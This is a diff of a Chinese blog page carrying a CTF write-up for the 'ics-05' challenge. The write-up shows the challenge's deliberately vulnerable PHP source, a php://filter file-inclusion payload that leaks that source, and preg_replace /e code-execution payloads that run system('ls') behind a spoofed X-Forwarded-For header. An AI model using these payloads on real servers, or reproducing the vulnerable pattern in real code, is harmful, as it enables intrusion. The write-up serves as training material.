@@ -401,15 +401,14 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><h2 id="题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统"><a href="#题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统" class="headerlink" title="题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统"></a>题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</h2><p>点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面：<br>  <img src="/images/ics05-1.png" alt="ics05-1.png"><br>除了index.php页面，没有其他有效信息，查看源码：<br>  <img src="/images/ics05-2.png" alt="ics05-2.png"><br>可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞；<br>  <img src="/images/ics05-3.png" alt="ics05-3.png"><br>**<br>本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:<br>主要涉及到的函数：include(),require()、include_once(),require_once()<br>magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等<br>典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;<br>参考文章：<a href="https://blog.csdn.net/qq_29419013/article/details/81202358" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81202358</a><br>**<br>尝试读取index.php的页面源码，通过php内置协议直接读取代码：<br>?page=php://filter/read=convert.base64-encode/resource=index.php<br>  <img src="/images/ics05-4.png" alt="ics05-4.png"><br>得到很长一串base64编码，解码得到源码：</p>
+        <h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><h2 id="题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统"><a href="#题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统" class="headerlink" title="题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统"></a>题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</h2><p>点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面：<br><img src="https://s2.ax1x.com/2019/12/09/Qdb8IK.png" alt="Qdb8IK.png"><br>除了index.php页面，没有其他有效信息，查看源码：<br><img src="https://s2.ax1x.com/2019/12/09/QdbJPO.png" alt="QdbJPO.png"><br>可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞；<br> <img src="https://s2.ax1x.com/2019/12/09/QdjHKg.png" alt="QdjHKg.png"><br>**<br>本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:<br>主要涉及到的函数：include(),require()、include_once(),require_once()<br>magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等<br>典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;<br>参考文章：<a href="https://blog.csdn.net/qq_29419013/article/details/81202358" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81202358</a><br>**<br>尝试读取index.php的页面源码，通过php内置协议直接读取代码：<br>?page=php://filter/read=convert.base64-encode/resource=index.php<br><img src="https://s2.ax1x.com/2019/12/09/Qdjqbj.png" alt="Qdjqbj.png"><br>得到很长一串base64编码，解码得到源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"renderer"</span> content=<span class="string">"webkit"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge,chrome=1"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"layui/css/layui.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class="layui-nav"&gt;</span><br><span class="line">        &lt;li class="layui-nav-item layui-this"&gt;&lt;a href="?page=index"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;"&gt;</span><br><span class="line">        &lt;legend&gt;设备列表&lt;/legend&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">    &lt;table class="layui-hide" id="test"&gt;&lt;/table&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/html"</span> id=<span class="string">"switchTpl"</span>&gt;</span><br><span class="line">        &lt;!-- 这里的 checked 的状态只是演示 --&gt;</span><br><span class="line">        &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"sex"</span> value=<span class="string">"&#123;&#123;d.id&#125;&#125;"</span> lay-skin=<span class="string">"switch"</span> lay-text=<span class="string">"开|关"</span> lay-filter=<span class="string">"checkDemo"</span> &#123;&#123; d.id==<span class="number">1</span> <span class="number">0003</span> ? <span class="string">'checked'</span> : <span class="string">''</span> &#125;&#125;&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"layui/layui.js"</span> charset=<span class="string">"utf-8"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.<span class="keyword">use</span>(<span class="string">'table'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> table = layui.table,</span><br><span class="line">            form = layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: <span class="string">'#test'</span>,</span><br><span class="line">            url: <span class="string">'/somrthing.json'</span>,</span><br><span class="line">            cellMinWidth: <span class="number">80</span>,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: <span class="string">'numbers'</span> &#125;,</span><br><span class="line">                     &#123; type: <span class="string">'checkbox'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'id'</span>, title: <span class="string">'ID'</span>, width: <span class="number">100</span>, unresize: <span class="keyword">true</span>, sort: <span class="keyword">true</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'name'</span>, title: <span class="string">'设备名'</span>, templet: <span class="string">'#nameTpl'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'area'</span>, title: <span class="string">'区域'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'status'</span>, title: <span class="string">'维护状态'</span>, minWidth: <span class="number">120</span>, sort: <span class="keyword">true</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'check'</span>, title: <span class="string">'设备开关'</span>, width: <span class="number">85</span>, templet: <span class="string">'#switchTpl'</span>, unresize: <span class="keyword">true</span> &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: <span class="keyword">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.<span class="keyword">use</span>(<span class="string">'element'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> element = layui.element; <span class="comment">//导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="line">        <span class="comment">//监听导航点击</span></span><br><span class="line">        element.on(<span class="string">'nav(demo)'</span>, <span class="function"><span class="keyword">function</span><span class="params">(elem)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//console.log(elem)</span></span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">        &lt;p class="lead"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">            &lt;p class="lead"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'input'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'ta:text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($page === <span class="string">'index.php'</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Ok'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>($page);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <hr>
 <p>源码审计，得到如下可能存在问题的关键部分：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；<br>**<br>关于preg_replace：<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a><br>**<br>先来测试一下，看能不能输出关于PHP配置的信息；<br>构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww<br>同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’；<br>  <img src="/images/ics05-5.png" alt="ics05-5.png"><br>构造：<br>  <img src="/images/ics05-6.png" alt="ics05-6.png"><br>验证成功！<br>接下来尝试读取文件目录，利用system（）函数；<br>构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww<br>  <img src="/images/ics05-7.png" alt="ics05-7.png"><br>cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”):<br>**<br>%20url解释为空格、%26为&amp;<br>**</p>
-<p>得到flag文件，cd查看flag文件：<br>  <img src="/images/ics05-8.png" alt="ics05-8.png"><br>得到flag.php，使用cat查看内容：<br>  <img src="/images/ics05-9.png" alt="ics05-9.png"> </p>
+<p>可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；<br>**<br>关于preg_replace：<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a><br>**<br>先来测试一下，看能不能输出关于PHP配置的信息；<br>构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww<br>同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’；<br><img src="https://s2.ax1x.com/2019/12/09/QdjbrQ.png" alt="QdjbrQ.png"><br>构造：<br><img src="https://s2.ax1x.com/2019/12/09/Qdb3a6.png" alt="Qdb3a6.png"><br>验证成功！<br>接下来尝试读取文件目录，利用system（）函数；<br>构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww<br><img src="https://s2.ax1x.com/2019/12/09/Qdb1Vx.png" alt="Qdb1Vx.png"><br>cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”):<br>**<br>%20url解释为空格、%26为&amp;<br>**<br> <img src="https://s2.ax1x.com/2019/12/09/QdbMrR.png" alt="QdbMrR.png"><br>得到flag文件，cd查看flag文件：<br><img src="https://s2.ax1x.com/2019/12/09/QdbQq1.png" alt="QdbQq1.png"><br>得到flag.php，使用cat查看内容：<br><img src="https://s2.ax1x.com/2019/12/09/QdbKM9.png" alt="QdbKM9.png"></p>
 
     </article>
     <!-- license  -->
@@ -418,7 +417,7 @@ height:50vh;
             <p>Author：<a href="https://singlemindedt.github.io">Smtsec</a>
             <p>原文链接：<a href="https://singlemindedt.github.io/2019/10/05/ics-05/">https://singlemindedt.github.io/2019/10/05/ics-05/</a>
             <p>发表日期：<a href="https://singlemindedt.github.io/2019/10/05/ics-05/">October 5th 2019, 10:53:52 am</a>
-            <p>更新日期：<a href="https://singlemindedt.github.io/2019/10/05/ics-05/">December 9th 2019, 9:07:31 am</a>
+            <p>更新日期：<a href="https://singlemindedt.github.io/2019/10/05/ics-05/">December 9th 2019, 11:04:08 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1016,6 +1015,38 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 34
@@ -1034,17 +1065,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/NaNNaNNaNNaN-Batman/" >NaNNaNNaNNaN-Batman</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Training-WWW-Robots/" >Training-WWW-Robots</a>
         </li>
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/NaNNaNNaNNaN-Batman/" >NaNNaNNaNNaN-Batman</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Bug/" >Bug</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/ics-04/" >ics-04</a>
         </li>
     
     
@@ -1055,11 +1091,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/Mfw/" >Mfw</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/ics-04/" >ics-04</a>
         </li>
     
     
@@ -1174,17 +1205,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2019/09/01/反序列化/" >反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2019/09/01/xxe/" >xxe</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2019/09/01/VPS/" >VPS</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2019/09/01/反序列化/" >反序列化</a>
         </li>
     
     
@@ -1209,25 +1240,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
     
-        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
-    
-        <span class="sidebar-tag-name" data-tags="tools"><span class="iconfont-archer">&#xe606;</span>tools</span>
-    
-        <span class="sidebar-tag-name" data-tags="Hexo"><span class="iconfont-archer">&#xe606;</span>Hexo</span>
-    
-        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
-    
-        <span class="sidebar-tag-name" data-tags="re"><span class="iconfont-archer">&#xe606;</span>re</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
     
-        <span class="sidebar-tag-name" data-tags="正则表达式"><span class="iconfont-archer">&#xe606;</span>正则表达式</span>
+        <span class="sidebar-tag-name" data-tags="Hexo"><span class="iconfont-archer">&#xe606;</span>Hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="tools"><span class="iconfont-archer">&#xe606;</span>tools</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="re"><span class="iconfont-archer">&#xe606;</span>re</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="动态规划"><span class="iconfont-archer">&#xe606;</span>动态规划</span>
+    
+        <span class="sidebar-tag-name" data-tags="正则表达式"><span class="iconfont-archer">&#xe606;</span>正则表达式</span>
     
         <span class="sidebar-tag-name" data-tags="编码"><span class="iconfont-archer">&#xe606;</span>编码</span>
     
@@ -1272,15 +1303,15 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="CTF/攻防世界"><span class="iconfont-archer">&#xe60a;</span>CTF/攻防世界</span>
     
-        <span class="sidebar-category-name" data-categories="SQL"><span class="iconfont-archer">&#xe60a;</span>SQL</span>
+        <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
     
         <span class="sidebar-category-name" data-categories="notes"><span class="iconfont-archer">&#xe60a;</span>notes</span>
     
-        <span class="sidebar-category-name" data-categories="密码学"><span class="iconfont-archer">&#xe60a;</span>密码学</span>
-    
-        <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
+        <span class="sidebar-category-name" data-categories="SQL"><span class="iconfont-archer">&#xe60a;</span>SQL</span>
     
         <span class="sidebar-category-name" data-categories="Writeup/Web"><span class="iconfont-archer">&#xe60a;</span>Writeup/Web</span>
+    
+        <span class="sidebar-category-name" data-categories="密码学"><span class="iconfont-archer">&#xe60a;</span>密码学</span>
     
         <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
     
